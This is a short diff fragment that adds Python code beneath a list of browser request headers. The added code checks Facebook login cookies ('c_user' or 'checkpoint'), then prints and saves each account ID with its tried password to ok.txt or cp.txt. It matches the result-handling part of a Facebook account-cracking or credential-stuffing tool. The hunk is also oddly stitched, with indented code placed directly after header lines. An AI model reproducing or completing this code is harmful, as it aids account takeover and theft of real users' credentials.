@@ -44,3 +44,19 @@ sec-fetch-site: same-origin
 sec-fetch-user: ?1
 upgrade-insecure-requests: 1
 user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
+  
+  
+   if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print('\033[1;32m[ASAD-OK] '+cid+' | '+ps+'\033[0;97m')
+                open('ok.txt', 'a').write(cid+' | '+ps+'\n')
+                oks.append(cid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[24:39]
+                print('\033[1;31m[ASAD-CP] '+cid+' | '+ps+'\033[0;97m')
+                open('cp.txt', 'a').write(cid+' | '+ps+'\n')
+                cps.append(cid)
+                break
